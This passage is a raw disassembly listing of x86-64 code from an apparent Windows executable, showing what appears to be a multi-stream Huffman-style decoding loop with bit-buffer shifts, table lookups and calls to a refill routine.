   140004777:	66 89 07             	mov    %ax,(%rdi)
   14000477a:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   14000477f:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   140004785:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004789:	4c 03 c7             	add    %rdi,%r8
   14000478c:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140004791:	03 c8                	add    %eax,%ecx
   140004793:	48 d3 e2             	shl    %cl,%rdx
   140004796:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000479a:	41 8b cd             	mov    %r13d,%ecx
   14000479d:	48 d3 ea             	shr    %cl,%rdx
   1400047a0:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400047a5:	66 41 89 00          	mov    %ax,(%r8)
   1400047a9:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400047ae:	44 0f b6 4c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r9d
   1400047b4:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400047b8:	4d 03 c8             	add    %r8,%r9
   1400047bb:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   1400047c0:	03 c8                	add    %eax,%ecx
   1400047c2:	48 d3 e2             	shl    %cl,%rdx
   1400047c5:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400047c9:	41 8b cd             	mov    %r13d,%ecx
   1400047cc:	48 d3 ea             	shr    %cl,%rdx
   1400047cf:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400047d4:	66 41 89 01          	mov    %ax,(%r9)
   1400047d8:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400047dd:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400047e1:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   1400047e7:	03 c8                	add    %eax,%ecx
   1400047e9:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   1400047ee:	4d 03 c1             	add    %r9,%r8
   1400047f1:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400047f5:	48 d3 e2             	shl    %cl,%rdx
   1400047f8:	41 8b cd             	mov    %r13d,%ecx
   1400047fb:	48 d3 ea             	shr    %cl,%rdx
   1400047fe:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004803:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004808:	66 41 89 00          	mov    %ax,(%r8)
   14000480c:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004811:	0f b6 7c 93 07       	movzbl 0x7(%rbx,%rdx,4),%edi
   140004816:	01 44 24 28          	add    %eax,0x28(%rsp)
   14000481a:	49 03 f8             	add    %r8,%rdi
   14000481d:	e8 9e ca ff ff       	call   0x1400012c0
   140004822:	33 c9                	xor    %ecx,%ecx
   140004824:	85 c0                	test   %eax,%eax
   140004826:	0f 94 c1             	sete   %cl
   140004829:	33 c0                	xor    %eax,%eax
   14000482b:	48 3b fe             	cmp    %rsi,%rdi
   14000482e:	0f 92 c0             	setb   %al
   140004831:	85 c8                	test   %ecx,%eax
   140004833:	0f 85 27 ff ff ff    	jne    0x140004760
   140004839:	48 8b 75 c8          	mov    -0x38(%rbp),%rsi
   14000483d:	41 bd 3f 00 00 00    	mov    $0x3f,%r13d
   140004843:	44 8b 65 68          	mov    0x68(%rbp),%r12d
   140004847:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000484b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004850:	48 83 c0 fe          	add    $0xfffffffffffffffe,%rax
   140004854:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140004858:	e8 63 ca ff ff       	call   0x1400012c0
   14000485d:	33 c9                	xor    %ecx,%ecx
   14000485f:	85 c0                	test   %eax,%eax
   140004861:	0f 94 c1             	sete   %cl
   140004864:	33 c0                	xor    %eax,%eax
   140004866:	48 3b 7d c8          	cmp    -0x38(%rbp),%rdi
   14000486a:	0f 96 c0             	setbe  %al
   14000486d:	85 c8                	test   %ecx,%eax
   14000486f:	74 71                	je     0x1400048e2
   140004871:	41 8b c5             	mov    %r13d,%eax
   140004874:	4c 8b 6d c8          	mov    -0x38(%rbp),%r13
   140004878:	41 2b c4             	sub    %r12d,%eax
   14000487b:	44 8b e0             	mov    %eax,%r12d
   14000487e:	41 ff c4             	inc    %r12d
   140004881:	41 83 e4 3f          	and    $0x3f,%r12d
   140004885:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000488c:	00 00 00 00 
   140004890:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   140004894:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140004899:	48 d3 e2             	shl    %cl,%rdx
   14000489c:	41 8b cc             	mov    %r12d,%ecx
   14000489f:	48 d3 ea             	shr    %cl,%rdx
   1400048a2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400048a7:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400048ac:	66 89 07             	mov    %ax,(%rdi)
   1400048af:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400048b4:	01 44 24 28          	add    %eax,0x28(%rsp)
   1400048b8:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   1400048bd:	48 03 f8             	add    %rax,%rdi
   1400048c0:	e8 fb c9 ff ff       	call   0x1400012c0
   1400048c5:	33 c9                	xor    %ecx,%ecx
   1400048c7:	85 c0                	test   %eax,%eax
   1400048c9:	0f 94 c1             	sete   %cl
   1400048cc:	33 c0                	xor    %eax,%eax
   1400048ce:	49 3b fd             	cmp    %r13,%rdi
   1400048d1:	0f 96 c0             	setbe  %al
   1400048d4:	85 c8                	test   %ecx,%eax
   1400048d6:	75 b8                	jne    0x140004890
   1400048d8:	44 8b 65 68          	mov    0x68(%rbp),%r12d
   1400048dc:	41 bd 3f 00 00 00    	mov    $0x3f,%r13d
   1400048e2:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   1400048e6:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   1400048ea:	4d 8d 51 fe          	lea    -0x2(%r9),%r10
   1400048ee:	49 3b fa             	cmp    %r10,%rdi
   1400048f1:	77 3f                	ja     0x140004932
   1400048f3:	45 8b c5             	mov    %r13d,%r8d
   1400048f6:	45 2b c4             	sub    %r12d,%r8d
   1400048f9:	41 ff c0             	inc    %r8d
   1400048fc:	41 83 e0 3f          	and    $0x3f,%r8d
   140004900:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140004905:	48 d3 e2             	shl    %cl,%rdx
   140004908:	41 8b c8             	mov    %r8d,%ecx
   14000490b:	48 d3 ea             	shr    %cl,%rdx
   14000490e:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004913:	66 89 07             	mov    %ax,(%rdi)
   140004916:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   14000491b:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   14000491f:	03 c8                	add    %eax,%ecx
   140004921:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004926:	48 03 f8             	add    %rax,%rdi
   140004929:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   14000492d:	49 3b fa             	cmp    %r10,%rdi
   140004930:	76 ce                	jbe    0x140004900
   140004932:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004938:	49 3b f9             	cmp    %r9,%rdi
   14000493b:	73 44                	jae    0x140004981
   14000493d:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
   140004942:	48 d3 e2             	shl    %cl,%rdx
   140004945:	41 8b cc             	mov    %r12d,%ecx
   140004948:	f7 d9                	neg    %ecx
   14000494a:	48 d3 ea             	shr    %cl,%rdx
   14000494d:	0f b6 44 93 04       	movzbl 0x4(%rbx,%rdx,4),%eax
   140004952:	88 07                	mov    %al,(%rdi)
   140004954:	80 7c 93 07 01       	cmpb   $0x1,0x7(%rbx,%rdx,4)
   140004959:	75 0b                	jne    0x140004966
   14000495b:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004960:	01 44 24 28          	add    %eax,0x28(%rsp)
   140004964:	eb 1b                	jmp    0x140004981
   140004966:	8b 4c 24 28          	mov    0x28(%rsp),%ecx
   14000496a:	41 3b c8             	cmp    %r8d,%ecx
   14000496d:	73 12                	jae    0x140004981
   14000496f:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004974:	03 c8                	add    %eax,%ecx
   140004976:	41 3b c8             	cmp    %r8d,%ecx
   140004979:	41 0f 47 c8          	cmova  %r8d,%ecx
   14000497d:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140004981:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
   140004985:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000498a:	48 83 c7 f9          	add    $0xfffffffffffffff9,%rdi
   14000498e:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
   140004992:	e8 29 c9 ff ff       	call   0x1400012c0
   140004997:	33 c9                	xor    %ecx,%ecx
   140004999:	85 c0                	test   %eax,%eax
   14000499b:	0f 94 c1             	sete   %cl
   14000499e:	33 c0                	xor    %eax,%eax
   1400049a0:	4c 3b ff             	cmp    %rdi,%r15
   1400049a3:	0f 92 c0             	setb   %al
   1400049a6:	85 c8                	test   %ecx,%eax
   1400049a8:	0f 84 04 01 00 00    	je     0x140004ab2
   1400049ae:	41 8b c5             	mov    %r13d,%eax
   1400049b1:	41 8b fc             	mov    %r12d,%edi
   1400049b4:	4c 8b 6d f0          	mov    -0x10(%rbp),%r13
   1400049b8:	41 2b c4             	sub    %r12d,%eax
   1400049bb:	ff c0                	inc    %eax
   1400049bd:	f7 df                	neg    %edi
   1400049bf:	83 e0 3f             	and    $0x3f,%eax
   1400049c2:	83 e7 3f             	and    $0x3f,%edi
   1400049c5:	44 8b e0             	mov    %eax,%r12d
   1400049c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400049cf:	00 
   1400049d0:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1400049d4:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400049d9:	48 d3 e2             	shl    %cl,%rdx
   1400049dc:	41 8b cc             	mov    %r12d,%ecx
   1400049df:	48 d3 ea             	shr    %cl,%rdx
   1400049e2:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   1400049e7:	66 41 89 07          	mov    %ax,(%r15)
   1400049eb:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   1400049f0:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   1400049f6:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1400049fa:	4d 03 c7             	add    %r15,%r8
   1400049fd:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004a02:	03 c8                	add    %eax,%ecx
   140004a04:	48 d3 e2             	shl    %cl,%rdx
   140004a07:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004a0b:	8b cf                	mov    %edi,%ecx
   140004a0d:	48 d3 ea             	shr    %cl,%rdx
   140004a10:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004a15:	66 41 89 00          	mov    %ax,(%r8)
   140004a19:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004a1e:	44 0f b6 4c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r9d
   140004a24:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004a28:	4d 03 c8             	add    %r8,%r9
   140004a2b:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004a30:	03 c8                	add    %eax,%ecx
   140004a32:	48 d3 e2             	shl    %cl,%rdx
   140004a35:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004a39:	8b cf                	mov    %edi,%ecx
   140004a3b:	48 d3 ea             	shr    %cl,%rdx
   140004a3e:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004a43:	66 41 89 01          	mov    %ax,(%r9)
   140004a47:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004a4c:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004a50:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   140004a56:	03 c8                	add    %eax,%ecx
   140004a58:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004a5d:	4d 03 c1             	add    %r9,%r8
   140004a60:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004a64:	48 d3 e2             	shl    %cl,%rdx
   140004a67:	8b cf                	mov    %edi,%ecx
   140004a69:	48 d3 ea             	shr    %cl,%rdx
   140004a6c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004a71:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004a76:	66 41 89 00          	mov    %ax,(%r8)
   140004a7a:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004a7f:	44 0f b6 7c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r15d
   140004a85:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004a89:	4d 03 f8             	add    %r8,%r15
   140004a8c:	e8 2f c8 ff ff       	call   0x1400012c0
   140004a91:	33 c9                	xor    %ecx,%ecx
   140004a93:	85 c0                	test   %eax,%eax
   140004a95:	0f 94 c1             	sete   %cl
   140004a98:	33 c0                	xor    %eax,%eax
   140004a9a:	4d 3b fd             	cmp    %r13,%r15
   140004a9d:	0f 92 c0             	setb   %al
   140004aa0:	85 c8                	test   %ecx,%eax
   140004aa2:	0f 85 28 ff ff ff    	jne    0x1400049d0
   140004aa8:	44 8b 65 68          	mov    0x68(%rbp),%r12d
   140004aac:	41 bd 3f 00 00 00    	mov    $0x3f,%r13d
   140004ab2:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
   140004ab6:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004abb:	48 83 c7 fe          	add    $0xfffffffffffffffe,%rdi
   140004abf:	48 89 7d 58          	mov    %rdi,0x58(%rbp)
   140004ac3:	e8 f8 c7 ff ff       	call   0x1400012c0
   140004ac8:	33 c9                	xor    %ecx,%ecx
   140004aca:	85 c0                	test   %eax,%eax
   140004acc:	0f 94 c1             	sete   %cl
   140004acf:	33 c0                	xor    %eax,%eax
   140004ad1:	4c 3b ff             	cmp    %rdi,%r15
   140004ad4:	0f 96 c0             	setbe  %al
   140004ad7:	85 c8                	test   %ecx,%eax
   140004ad9:	74 61                	je     0x140004b3c
   140004adb:	41 8b fd             	mov    %r13d,%edi
   140004ade:	41 2b fc             	sub    %r12d,%edi
   140004ae1:	4c 8b 65 58          	mov    0x58(%rbp),%r12
   140004ae5:	ff c7                	inc    %edi
   140004ae7:	83 e7 3f             	and    $0x3f,%edi
   140004aea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004af0:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004af4:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004af9:	48 d3 e2             	shl    %cl,%rdx
   140004afc:	8b cf                	mov    %edi,%ecx
   140004afe:	48 d3 ea             	shr    %cl,%rdx
   140004b01:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140004b06:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004b0b:	66 41 89 07          	mov    %ax,(%r15)
   140004b0f:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004b14:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004b18:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004b1d:	4c 03 f8             	add    %rax,%r15
   140004b20:	e8 9b c7 ff ff       	call   0x1400012c0
   140004b25:	33 c9                	xor    %ecx,%ecx
   140004b27:	85 c0                	test   %eax,%eax
   140004b29:	0f 94 c1             	sete   %cl
   140004b2c:	33 c0                	xor    %eax,%eax
   140004b2e:	4d 3b fc             	cmp    %r12,%r15
   140004b31:	0f 96 c0             	setbe  %al
   140004b34:	85 c8                	test   %ecx,%eax
   140004b36:	75 b8                	jne    0x140004af0
   140004b38:	44 8b 65 68          	mov    0x68(%rbp),%r12d
   140004b3c:	4c 8b 55 d8          	mov    -0x28(%rbp),%r10
   140004b40:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004b44:	4d 8d 4a fe          	lea    -0x2(%r10),%r9
   140004b48:	4d 3b f9             	cmp    %r9,%r15
   140004b4b:	77 46                	ja     0x140004b93
   140004b4d:	45 8b c5             	mov    %r13d,%r8d
   140004b50:	45 2b c4             	sub    %r12d,%r8d
   140004b53:	41 ff c0             	inc    %r8d
   140004b56:	41 83 e0 3f          	and    $0x3f,%r8d
   140004b5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004b60:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004b65:	48 d3 e2             	shl    %cl,%rdx
   140004b68:	41 8b c8             	mov    %r8d,%ecx
   140004b6b:	48 d3 ea             	shr    %cl,%rdx
   140004b6e:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004b73:	66 41 89 07          	mov    %ax,(%r15)
   140004b77:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004b7c:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004b80:	03 c8                	add    %eax,%ecx
   140004b82:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004b87:	4c 03 f8             	add    %rax,%r15
   140004b8a:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004b8e:	4d 3b f9             	cmp    %r9,%r15
   140004b91:	76 cd                	jbe    0x140004b60
   140004b93:	4d 3b fa             	cmp    %r10,%r15
   140004b96:	73 49                	jae    0x140004be1
   140004b98:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004b9d:	48 d3 e2             	shl    %cl,%rdx
   140004ba0:	41 8b cc             	mov    %r12d,%ecx
   140004ba3:	f7 d9                	neg    %ecx
   140004ba5:	48 d3 ea             	shr    %cl,%rdx
   140004ba8:	0f b6 44 93 04       	movzbl 0x4(%rbx,%rdx,4),%eax
   140004bad:	41 88 07             	mov    %al,(%r15)
   140004bb0:	80 7c 93 07 01       	cmpb   $0x1,0x7(%rbx,%rdx,4)
   140004bb5:	75 0b                	jne    0x140004bc2
   140004bb7:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004bbc:	01 44 24 50          	add    %eax,0x50(%rsp)
   140004bc0:	eb 1f                	jmp    0x140004be1
   140004bc2:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140004bc6:	83 f9 40             	cmp    $0x40,%ecx
   140004bc9:	73 16                	jae    0x140004be1
   140004bcb:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004bd0:	03 c8                	add    %eax,%ecx
   140004bd2:	b8 40 00 00 00       	mov    $0x40,%eax
   140004bd7:	83 f9 40             	cmp    $0x40,%ecx
   140004bda:	0f 47 c8             	cmova  %eax,%ecx
   140004bdd:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   140004be1:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
   140004be5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004bea:	48 83 c7 f9          	add    $0xfffffffffffffff9,%rdi
   140004bee:	48 89 7d 58          	mov    %rdi,0x58(%rbp)
   140004bf2:	e8 c9 c6 ff ff       	call   0x1400012c0
   140004bf7:	33 c9                	xor    %ecx,%ecx
   140004bf9:	85 c0                	test   %eax,%eax
   140004bfb:	0f 94 c1             	sete   %cl
   140004bfe:	33 c0                	xor    %eax,%eax
   140004c00:	4c 3b f7             	cmp    %rdi,%r14
   140004c03:	0f 92 c0             	setb   %al
   140004c06:	85 c8                	test   %ecx,%eax
   140004c08:	0f 84 fe 00 00 00    	je     0x140004d0c
   140004c0e:	41 8b fc             	mov    %r12d,%edi
   140004c11:	45 8b fd             	mov    %r13d,%r15d
   140004c14:	45 2b fc             	sub    %r12d,%r15d
   140004c17:	f7 df                	neg    %edi
   140004c19:	4c 8b 65 58          	mov    0x58(%rbp),%r12
   140004c1d:	41 ff c7             	inc    %r15d
   140004c20:	41 83 e7 3f          	and    $0x3f,%r15d
   140004c24:	83 e7 3f             	and    $0x3f,%edi
   140004c27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004c2e:	00 00 
   140004c30:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004c34:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004c39:	48 d3 e2             	shl    %cl,%rdx
   140004c3c:	41 8b cf             	mov    %r15d,%ecx
   140004c3f:	48 d3 ea             	shr    %cl,%rdx
   140004c42:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004c47:	66 41 89 06          	mov    %ax,(%r14)
   140004c4b:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004c50:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   140004c56:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004c5a:	4d 03 c6             	add    %r14,%r8
   140004c5d:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004c62:	03 c8                	add    %eax,%ecx
   140004c64:	48 d3 e2             	shl    %cl,%rdx
   140004c67:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004c6b:	8b cf                	mov    %edi,%ecx
   140004c6d:	48 d3 ea             	shr    %cl,%rdx
   140004c70:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004c75:	66 41 89 00          	mov    %ax,(%r8)
   140004c79:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004c7e:	44 0f b6 4c 93 07    	movzbl 0x7(%rbx,%rdx,4),%r9d
   140004c84:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004c88:	4d 03 c8             	add    %r8,%r9
   140004c8b:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004c90:	03 c8                	add    %eax,%ecx
   140004c92:	48 d3 e2             	shl    %cl,%rdx
   140004c95:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004c99:	8b cf                	mov    %edi,%ecx
   140004c9b:	48 d3 ea             	shr    %cl,%rdx
   140004c9e:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004ca3:	66 41 89 01          	mov    %ax,(%r9)
   140004ca7:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004cac:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004cb0:	44 0f b6 44 93 07    	movzbl 0x7(%rbx,%rdx,4),%r8d
   140004cb6:	03 c8                	add    %eax,%ecx
   140004cb8:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004cbd:	4d 03 c1             	add    %r9,%r8
   140004cc0:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004cc4:	48 d3 e2             	shl    %cl,%rdx
   140004cc7:	8b cf                	mov    %edi,%ecx
   140004cc9:	48 d3 ea             	shr    %cl,%rdx
   140004ccc:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004cd1:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004cd6:	66 41 89 00          	mov    %ax,(%r8)
   140004cda:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004cdf:	44 0f b6 74 93 07    	movzbl 0x7(%rbx,%rdx,4),%r14d
   140004ce5:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004ce9:	4d 03 f0             	add    %r8,%r14
   140004cec:	e8 cf c5 ff ff       	call   0x1400012c0
   140004cf1:	33 c9                	xor    %ecx,%ecx
   140004cf3:	85 c0                	test   %eax,%eax
   140004cf5:	0f 94 c1             	sete   %cl
   140004cf8:	33 c0                	xor    %eax,%eax
   140004cfa:	4d 3b f4             	cmp    %r12,%r14
   140004cfd:	0f 92 c0             	setb   %al
   140004d00:	85 c8                	test   %ecx,%eax
   140004d02:	0f 85 28 ff ff ff    	jne    0x140004c30
   140004d08:	44 8b 65 68          	mov    0x68(%rbp),%r12d
   140004d0c:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   140004d10:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004d15:	49 83 c7 fe          	add    $0xfffffffffffffffe,%r15
   140004d19:	e8 a2 c5 ff ff       	call   0x1400012c0
   140004d1e:	33 c9                	xor    %ecx,%ecx
   140004d20:	85 c0                	test   %eax,%eax
   140004d22:	0f 94 c1             	sete   %cl
   140004d25:	33 c0                	xor    %eax,%eax
   140004d27:	4d 3b f7             	cmp    %r15,%r14
   140004d2a:	0f 96 c0             	setbe  %al
   140004d2d:	85 c8                	test   %ecx,%eax
   140004d2f:	74 57                	je     0x140004d88
   140004d31:	41 8b fd             	mov    %r13d,%edi
   140004d34:	41 2b fc             	sub    %r12d,%edi
   140004d37:	ff c7                	inc    %edi
   140004d39:	83 e7 3f             	and    $0x3f,%edi
   140004d3c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004d40:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004d44:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004d49:	48 d3 e2             	shl    %cl,%rdx
   140004d4c:	8b cf                	mov    %edi,%ecx
   140004d4e:	48 d3 ea             	shr    %cl,%rdx
   140004d51:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004d56:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004d5b:	66 41 89 06          	mov    %ax,(%r14)
   140004d5f:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004d64:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004d68:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004d6d:	4c 03 f0             	add    %rax,%r14
   140004d70:	e8 4b c5 ff ff       	call   0x1400012c0
   140004d75:	33 c9                	xor    %ecx,%ecx
   140004d77:	85 c0                	test   %eax,%eax
   140004d79:	0f 94 c1             	sete   %cl
   140004d7c:	33 c0                	xor    %eax,%eax
   140004d7e:	4d 3b f7             	cmp    %r15,%r14
   140004d81:	0f 96 c0             	setbe  %al
   140004d84:	85 c8                	test   %ecx,%eax
   140004d86:	75 b8                	jne    0x140004d40
   140004d88:	4c 8b 55 e0          	mov    -0x20(%rbp),%r10
   140004d8c:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004d90:	4d 8d 4a fe          	lea    -0x2(%r10),%r9
   140004d94:	4d 3b f1             	cmp    %r9,%r14
   140004d97:	77 4a                	ja     0x140004de3
   140004d99:	45 8b c5             	mov    %r13d,%r8d
   140004d9c:	45 2b c4             	sub    %r12d,%r8d
   140004d9f:	41 ff c0             	inc    %r8d
   140004da2:	41 83 e0 3f          	and    $0x3f,%r8d
   140004da6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004dad:	00 00 00 
   140004db0:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004db5:	48 d3 e2             	shl    %cl,%rdx
   140004db8:	41 8b c8             	mov    %r8d,%ecx
   140004dbb:	48 d3 ea             	shr    %cl,%rdx
   140004dbe:	0f b7 44 93 04       	movzwl 0x4(%rbx,%rdx,4),%eax
   140004dc3:	66 41 89 06          	mov    %ax,(%r14)
   140004dc7:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004dcc:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004dd0:	03 c8                	add    %eax,%ecx
   140004dd2:	0f b6 44 93 07       	movzbl 0x7(%rbx,%rdx,4),%eax
   140004dd7:	4c 03 f0             	add    %rax,%r14
   140004dda:	89 4c 24 78          	mov    %ecx,0x78(%rsp)
   140004dde:	4d 3b f1             	cmp    %r9,%r14
   140004de1:	76 cd                	jbe    0x140004db0
   140004de3:	4d 3b f2             	cmp    %r10,%r14
   140004de6:	73 49                	jae    0x140004e31
   140004de8:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140004ded:	48 d3 e2             	shl    %cl,%rdx
   140004df0:	41 8b cc             	mov    %r12d,%ecx
   140004df3:	f7 d9                	neg    %ecx
   140004df5:	48 d3 ea             	shr    %cl,%rdx
   140004df8:	0f b6 44 93 04       	movzbl 0x4(%rbx,%rdx,4),%eax
   140004dfd:	41 88 06             	mov    %al,(%r14)
   140004e00:	80 7c 93 07 01       	cmpb   $0x1,0x7(%rbx,%rdx,4)
   140004e05:	75 0b                	jne    0x140004e12
   140004e07:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004e0c:	01 44 24 78          	add    %eax,0x78(%rsp)
   140004e10:	eb 1f                	jmp    0x140004e31
   140004e12:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   140004e16:	83 f9 40             	cmp    $0x40,%ecx
   140004e19:	73 16                	jae    0x140004e31
   140004e1b:	0f b6 44 93 06       	movzbl 0x6(%rbx,%rdx,4),%eax
   140004e20:	03 c8                	add    %eax,%ecx
   140004e22:	b8 40 00 00 00       	mov    $0x40,%eax
